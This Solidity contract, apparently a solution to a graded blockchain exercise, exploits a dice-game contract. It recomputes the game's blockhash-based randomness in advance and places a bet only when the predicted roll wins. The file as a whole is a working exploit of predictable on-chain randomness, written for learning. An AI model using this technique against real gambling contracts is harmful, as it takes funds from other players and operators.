pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    event Received(address, uint);
    event Rolled(uint);
    event NotRolled(uint);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address payable _addr, uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance, "Not enough funds to withdraw requested amount.");
        _addr.transfer(_amount);
    }

    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Not enough funds in the RiggedRoll contract.");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 expectedResult = uint256(hash) % 16;

        console.log("Expected Result: ", expectedResult);

        if (expectedResult <= 2) {
            diceGame.rollTheDice{value: 0.002 ether}();
            emit Rolled(expectedResult);
        } else {
            emit NotRolled(expectedResult);
        }
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}
